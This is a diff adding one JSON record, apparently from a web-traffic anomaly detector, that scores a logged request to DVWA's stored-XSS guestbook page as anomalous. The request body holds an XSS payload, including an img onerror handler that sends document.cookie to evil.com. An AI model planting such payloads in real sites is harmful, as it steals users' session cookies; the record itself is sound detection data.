@@ -1,0 +1,27 @@
+{
+  "request": {
+    "body_bytes": "249086",
+    "method": "GET",
+    "path": "/DVWA/vulnerabilities/xss_s/",
+    "protocol": "HTTP/1.1",
+    "request_body": "txtName=<script>alert('XSS')</script>&mtxMessage=<img src=\"\" onerror=\"this.src='http://evil.com/log.php?cookie='+document.cookie\">&btnSign=Sign Guestbook"
+  },
+  "category": 1,
+  "reconstruction_loss": 3.3803669929504396,
+  "details": {
+    "combined_score": 8.499218834893805,
+    "if_prediction": 0,
+    "if_score": 0.4630321544524632,
+    "statistical_anomaly": 1,
+    "z_score": 23.447741776552864,
+    "percentile_anomaly": 1,
+    "reconstruction_error": 3.3803669929504396,
+    "perplexity": 38.455706145445234,
+    "votes": {
+      "iforest": 0,
+      "statistical": 1,
+      "percentile": 1,
+      "total_votes": 2
+    }
+  }
+}
